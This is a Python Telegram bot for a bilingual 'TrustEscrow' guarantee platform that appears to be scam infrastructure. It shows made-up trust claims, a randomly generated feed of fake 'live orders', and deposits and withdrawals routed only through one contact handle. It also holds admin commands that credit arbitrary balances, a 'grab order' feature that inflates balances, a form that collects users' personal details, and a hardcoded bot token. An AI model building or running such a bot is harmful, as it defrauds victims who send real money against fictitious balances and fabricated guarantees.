# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime
import random

# ===================== 配置（直接用你的Token） =====================
BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
ADMIN_ID = 6365510771
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 雙語完整版文案（1:1 還原你截圖風格） =====================
TEXT = {
    "zh": {
        "home": """🏠 TrustEscrow 專業擔保平台

我們已在擔保行業立足 5 年，
專注解決線上交易欺詐問題，讓買賣雙方都安全。

【平台優勢】
✅ 5年零詐騙、數千用戶信賴
✅ 專業中間人墊資擔保
✅ 資金全程託管、絕對安全
✅ 口令配對、簡單快速
✅ 7×24線上客服支援

安全交易，從這裡開始。""",

        "about": """🏛️ 關於我們

TrustEscrow 已在擔保行業立足 5 年，
是業內最專業、最具信譽的老牌擔保平台。

5年實績：
✅ 10,000+ 筆安全交易完成
✅ 數千位長期用戶信賴
✅ 零負評、零詐騙、零風險
✅ 合法運營、專業團隊
✅ 全年無休線上服務

我們不做一筆生意，只做一輩子的信賴。""",

        "service": """📌 服務介紹

我們專注「中間人墊資擔保」模式，
徹底解決線上交易不信任痛點。

服務項目：
✅ 買賣雙方口令配對擔保
✅ 專業中間人墊資保障交易
✅ 買方資金平台託管凍結
✅ 交易公平公正、全程可查
✅ 糾紛處理、風險管控

適用：遊戲、數位商品、私人買賣、線上交易等。""",

        "safety": """🛡️ 安全保障

我們的機制讓你交易零擔心：

✅ 買方資金 100% 平台託管
✅ 賣方確認收款才發貨
✅ 中間人實名驗證 + 資金實力保證
✅ 訂單加密、不可篡改
✅ 專屬唯一口令、不可複製
✅ 5年零詐騙安全記錄

每一筆交易，都受到完整保護。""",

        "help": """📞 幫助中心

任何問題請立即聯繫官方客服：
➡️ 客服專線：@fcff88

服務範圍：
● 儲值 / 提現 處理
● 訂單查詢、異常處理
● 糾紛協調、投訴處理
● 中間人申請、商務合作

線上時間：7×24 看到即回""",

        "deposit": """💰 儲值入口

僅透過官方客服處理儲值，保障資金安全。
➡️ 專屬客服：@fcff88

流程：
1. 聯繫客服並提供你的用戶ID
2. 選擇儲值金額與支付方式
3. 完成付款並提交截圖
4. 資金即時到帳，可立即使用

⚠️ 僅官方客服處理，其他皆為詐騙。""",

        "withdraw": """💳 提現入口

提現僅透過官方客服審核處理。
➡️ 專屬客服：@fcff88

流程：
1. 聯繫客服並提供用戶ID
2. 告知提現金額與收款方式
3. 等待管理員審核
4. 審核通過立即發放款項

⚠️ 帳號需通過安全驗證。""",

        "history": """📜 擔保歷史

你的個人擔保記錄，所有訂單可查、不可刪除。

目前無歷史記錄
詳細查詢請聯繫客服 @fcff88""",

        "running": """🚨 平台實時擔保中訂單
━━━━━━━━━━━━━━━━━━━
{}
━━━━━━━━━━━━━━━━━━━
🔥 每秒都有訂單在成交
安全 · 熱門 · 專業 · 可靠""",

        "personal": "👤 個人中心\n用戶ID: {}\n錢包餘額: {:.2f} USDT\n✅ 入駐狀態: {}",
        "create_escrow": "🚀 發起擔保",
        "join_escrow": "📥 輸入口令擔保",
        "input_amount": "💰 請輸入擔保金額（USDT）：",
        "input_tip": "🔒 請設置交易口令：",
        "input_sell_tip": "🔑 請輸入擔保口令：",
        "escrow_success": "✅ 擔保已發起！\n金額: {:.2f} USDT\n口令: {}\n請發送給賣方。",
        "pair_success": "✅ 訂單配對成功！\n買方: {}\n賣方: {}\n金額: {:.2f} USDT\n管理員已接收。",
        "no_money": "❌ 餘額不足",
        "tip_error": "❌ 口令錯誤",
        "back": "🏠 返回首頁",
        "lang": "🌐 English",
        "grab_success": "✅ 搶單成功！\n獲得 {} USDT\n當前餘額: {:.2f} USDT",
        "reg_success": "✅ 入駐成功！\n歡迎使用 TrustEscrow 專業擔保平台",
        "assign_success": "✅ 派單成功！\n用戶ID: {}\n金額: {:.2f} USDT",
        "assign_notify": "📥 管理員派單到賬\n金額: {:.2f} USDT\n當前餘額: {:.2f} USDT"
    },

    "en": {
        "home": """🏠 TrustEscrow Professional Escrow

We have been in the escrow industry for 5 years,
focused on eliminating scams and protecting both parties.

【Features】
✅ 5 Years 0 Fraud
✅ Professional Guarantor Funding
✅ 100% Safe Escrow
✅ Code Pairing System
✅ 7×24 Support

Trade safely with us.""",

        "about": """🏛️ About Us

TrustEscrow has been in the escrow industry for 5+ years,
one of the most trusted and professional platforms.

5 Years Achievement:
✅ 10,000+ Successful Deals
✅ Thousands of Loyal Users
✅ 0 Fraud & 0 Complaints
✅ Legal & Professional Team
✅ 24/7 Service

We don’t chase deals. We build trust.""",

        "service": """📌 Services

We specialize in GUARANTOR-ESCROW SERVICE.

Services:
✅ Buyer & Seller Code Pairing
✅ Guarantor Funding Support
✅ Safe Fund Escrow
✅ Fair & Transparent System
✅ Dispute & Risk Control

For gaming, digital goods, private deals.""",

        "safety": """🛡️ Security

Our system protects you 100%:

✅ 100% Fund Escrow
✅ Seller Gets Paid First
✅ Verified Professional Guarantors
✅ Encrypted Order System
✅ Unique Order Code
✅ 5-Year 0-Fraud Record

Every order is fully protected.""",

        "help": """📞 Help Center

Contact official support for any help:
➡️ Support: @fcff88

Service:
● Deposit / Withdraw
● Order Support
● Dispute Help
● Become a Guarantor

We reply 7×24.""",

        "deposit": """💰 Deposit

Deposit only via official support.
➡️ Support: @fcff88

Process:
1. Contact support with your User ID
2. Choose amount & payment method
3. Send payment screenshot
4. Fund credited instantly

⚠️ Only official support is safe.""",

        "withdraw": """💳 Withdraw

Withdraw only via official support.
➡️ Support: @fcff88

Process:
1. Contact support with User ID
2. Provide amount & receive method
3. Wait admin review
4. Fund sent after approval""",

        "history": """📜 Escrow History

Your personal order record.

No history yet.
For details contact @fcff88""",

        "running": """🚨 LIVE ORDERS IN ESCROW
━━━━━━━━━━━━━━━━━━━
{}
━━━━━━━━━━━━━━━━━━━
🔥 Deals happening every second
Safe · Hot · Professional · Reliable""",

        "personal": "👤 Profile\nID: {}\nBalance: {:.2f} USDT\n✅ Status: {}",
        "create_escrow": "🚀 Create Escrow",
        "join_escrow": "📥 Enter Code",
        "input_amount": "💰 Enter amount (USDT):",
        "input_tip": "🔒 Set your code:",
        "input_sell_tip": "🔑 Enter escrow code:",
        "escrow_success": "✅ Escrow created!\nAmount: {:.2f}\nCode: {}",
        "pair_success": "✅ Order paired!\nBuyer: {}\nSeller: {}\nAmount: {:.2f}",
        "no_money": "❌ Insufficient balance",
        "tip_error": "❌ Invalid code",
        "back": "🏠 Home",
        "lang": "🌐 繁中",
        "grab_success": "✅ Grab success!\nGot {} USDT\nCurrent balance: {:.2f} USDT",
        "reg_success": "✅ Registration success!\nWelcome to TrustEscrow Professional Escrow",
        "assign_success": "✅ Assign success!\nUser ID: {}\nAmount: {:.2f} USDT",
        "assign_notify": "📥 Admin assign received\nAmount: {:.2f} USDT\nCurrent balance: {:.2f} USDT"
    }
}

# ===================== 數據存儲 =====================
user_lang = {}
user_step = {}
user_balance = {}
user_info = {}
orders = {}

# ===================== 菜單生成（1:1 還原你截圖排版） =====================
def main_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("🚀 發起擔保" if lang == "zh" else "🚀 Create Escrow", callback_data="create"),
        InlineKeyboardButton("📥 輸入口令" if lang == "zh" else "📥 Enter Code", callback_data="join"),
        InlineKeyboardButton("👤 個人中心" if lang == "zh" else "👤 Profile", callback_data="personal"),
        InlineKeyboardButton("🚨 實時擔保" if lang == "zh" else "🚨 Live Orders", callback_data="running"),
        InlineKeyboardButton("💰 儲值" if lang == "zh" else "💰 Deposit", callback_data="deposit"),
        InlineKeyboardButton("💳 提現" if lang == "zh" else "💳 Withdraw", callback_data="withdraw"),
        InlineKeyboardButton("📜 歷史" if lang == "zh" else "📜 History", callback_data="history"),
        InlineKeyboardButton("📌 服務" if lang == "zh" else "📌 Services", callback_data="service"),
        InlineKeyboardButton("🛡️ 安全" if lang == "zh" else "🛡️ Security", callback_data="safety"),
        InlineKeyboardButton("🏛️ 關於" if lang == "zh" else "🏛️ About", callback_data="about"),
        InlineKeyboardButton("📞 幫助" if lang == "zh" else "📞 Help", callback_data="help"),
        InlineKeyboardButton(t["lang"], callback_data="lang"),
    )
    return m

def back_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup(row_width=1)
    m.add(InlineKeyboardButton(t["back"], callback_data="home"))
    return m

# ===================== /start 啟動 =====================
@bot.message_handler(commands=['start'])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    user_step[u] = None
    user_balance.setdefault(u, 0.0)
    user_info.setdefault(u, {"name": "", "phone": "", "email": "", "addr": "", "ref": "", "status": "未入駐" if user_lang[u] == "zh" else "Unregistered"})
    t = TEXT[user_lang[u]]
    bot.send_message(msg.chat.id, t["home"], reply_markup=main_menu(u))

# ===================== 按鈕回調 =====================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    mid = c.message.message_id
    cid = c.message.chat.id

    pages = {
        "about": t["about"],
        "service": t["service"],
        "safety": t["safety"],
        "help": t["help"],
        "deposit": t["deposit"],
        "withdraw": t["withdraw"],
        "history": t["history"],
    }

    try:
        if c.data == "home":
            user_step[u] = None
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            t = TEXT[user_lang[u]]
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "personal":
            status = user_info[u]["status"]
            txt = t["personal"].format(u, user_balance.get(u, 0.0), status)
            bot.edit_message_text(txt, cid, mid, reply_markup=back_menu(u))

        elif c.data == "running":
            items = []
            status_list_zh = ["擔保處理中", "賣方已收款", "待配對", "擔保中", "等待買方確認"]
            status_list_en = ["Escrow Processing", "Seller Paid", "Pairing", "In Escrow", "Waiting Buyer"]
            status_list = status_list_zh if lang == "zh" else status_list_en
            for _ in range(4):
                code = "".join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ0123456789", k=4))
                amt = random.choice([380, 500, 680, 880, 1000, 1200, 1500, 1800, 2000, 2500])
                st = random.choice(status_list)
                items.append(f"⏳ 訂單 #{code}\n金額：{amt} USDT\n狀態：{st}" if lang == "zh" else f"⏳ Order #{code}\nAmount: {amt} USDT\nStatus: {st}")
            text = t["running"].format("\n\n".join(items))
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        elif c.data in pages:
            bot.edit_message_text(pages[c.data], cid, mid, reply_markup=back_menu(u))

        elif c.data == "create":
            user_step[u] = "create_amount"
            bot.edit_message_text(t["input_amount"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "join":
            user_step[u] = "join_tip"
            bot.edit_message_text(t["input_sell_tip"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "grab":
            amt = random.choice([50, 50, 50, 100])
            user_balance[u] = user_balance.get(u, 0.0) + amt
            txt = t["grab_success"].format(amt, user_balance[u])
            bot.edit_message_text(txt, cid, mid, reply_markup=main_menu(u))

        elif c.data == "assign":
            if u != ADMIN_ID:
                bot.answer_callback_query(c.id, "❌ 無權限" if lang == "zh" else "❌ No permission")
                return
            user_step[u] = "assign_uid"
            bot.edit_message_text("請輸入用戶UID：" if lang == "zh" else "Enter user ID:", cid, mid, reply_markup=back_menu(u))

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(c.id)

# ===================== 消息處理 =====================
@bot.message_handler(func=lambda m: True)
def msg(msg):
    u = msg.from_user.id
    cid = msg.chat.id
    txt = msg.text.strip()
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    user_balance.setdefault(u, 0.0)
    user_info.setdefault(u, {"name": "", "phone": "", "email": "", "addr": "", "ref": "", "status": "未入駐" if lang == "zh" else "Unregistered"})

    # 管理員加錢指令
    if u == ADMIN_ID and txt.startswith("/add"):
        p = txt.split()
        if len(p) == 3:
            try:
                uid = int(p[1])
                amt = float(p[2])
                user_balance[uid] = user_balance.get(uid, 0.0) + amt
                bot.send_message(cid, f"✅ 已充值 {amt} USDT 給 {uid}")
                # 通知用戶
                bot.send_message(uid, t["assign_notify"].format(amt, user_balance[uid]))
            except:
                bot.send_message(cid, "❌ 格式錯誤，正確格式：/add ID 金額")
        else:
            bot.send_message(cid, "❌ 格式錯誤，正確格式：/add ID 金額")
        return

    if u not in user_step:
        user_step[u] = None

    # 發起擔保 - 輸入金額
    if user_step[u] == "create_amount":
        try:
            amt = float(txt)
            if user_balance[u] < amt:
                bot.send_message(cid, t["no_money"], reply_markup=main_menu(u))
                user_step[u] = None
                return
            user_step[u] = {"step": "create_tip", "amount": amt}
            bot.send_message(cid, t["input_tip"], reply_markup=back_menu(u))
        except:
            bot.send_message(cid, "❌ 請輸入有效數字", reply_markup=back_menu(u))

    # 發起擔保 - 設置口令
    elif type(user_step[u]) == dict and user_step[u]["step"] == "create_tip":
        amt = user_step[u]["amount"]
        code = txt
        user_balance[u] -= amt
        orders[code] = {
            "buyer": u,
            "amount": amt,
            "time": datetime.now().strftime("%m-%d %H:%M")
        }
        bot.send_message(cid, t["escrow_success"].format(amt, code), reply_markup=main_menu(u))
        user_step[u] = None

    # 賣方輸入口令配對
    elif user_step[u] == "join_tip":
        code = txt
        if code not in orders:
            bot.send_message(cid, t["tip_error"], reply_markup=main_menu(u))
            user_step[u] = None
            return
        o = orders[code]
        bot.send_message(cid, t["pair_success"].format(o["buyer"], u, o["amount"]), reply_markup=main_menu(u))
        bot.send_message(ADMIN_ID, f"📥 新訂單\n口令：{code}\n買方：{o['buyer']}\n賣方：{u}\n金額：{o['amount']} USDT")
        del orders[code]
        user_step[u] = None

    # 入駐流程 - 姓名
    elif user_step[u] == "reg_name":
        user_info[u]["name"] = txt
        user_step[u] = "reg_phone"
        bot.send_message(cid, "請輸入電話：" if lang == "zh" else "Enter phone:", reply_markup=back_menu(u))

    # 入駐流程 - 電話
    elif user_step[u] == "reg_phone":
        user_info[u]["phone"] = txt
        user_step[u] = "reg_email"
        bot.send_message(cid, "請輸入郵箱：" if lang == "zh" else "Enter email:", reply_markup=back_menu(u))

    # 入駐流程 - 郵箱
    elif user_step[u] == "reg_email":
        user_info[u]["email"] = txt
        user_step[u] = "reg_addr"
        bot.send_message(cid, "請輸入地址：" if lang == "zh" else "Enter address:", reply_markup=back_menu(u))

    # 入駐流程 - 地址
    elif user_step[u] == "reg_addr":
        user_info[u]["addr"] = txt
        user_step[u] = "reg_ref"
        bot.send_message(cid, "請輸入推薦人：" if lang == "zh" else "Enter referrer:", reply_markup=back_menu(u))

    # 入駐流程 - 推薦人
    elif user_step[u] == "reg_ref":
        user_info[u]["ref"] = txt
        user_info[u]["status"] = "已入駐" if lang == "zh" else "Registered"
        user_step[u] = None
        bot.send_message(cid, t["reg_success"], reply_markup=main_menu(u))

    # 管理員派單 - 輸入UID
    elif user_step[u] == "assign_uid":
        try:
            target = int(txt)
            user_step[u] = ("assign_amt", target)
            bot.send_message(cid, "請輸入金額（USDT）：" if lang == "zh" else "Enter amount (USDT):", reply_markup=back_menu(u))
        except:
            bot.send_message(cid, "❌ 請輸入有效UID", reply_markup=back_menu(u))

    # 管理員派單 - 輸入金額
    elif type(user_step[u]) == tuple and user_step[u][0] == "assign_amt":
        target = user_step[u][1]
        try:
            amt = float(txt)
            user_balance[target] = user_balance.get(target, 0.0) + amt
            bot.send_message(cid, t["assign_success"].format(target, amt))
            bot.send_message(target, t["assign_notify"].format(amt, user_balance[target]))
            user_step[u] = None
        except:
            bot.send_message(cid, "❌ 請輸入有效金額", reply_markup=back_menu(u))

# ===================== 啟動機器人 =====================
if __name__ == "__main__":
    print("✅ TrustEscrow 豪華雙語版機器人啟動成功")
    bot.infinity_polling()
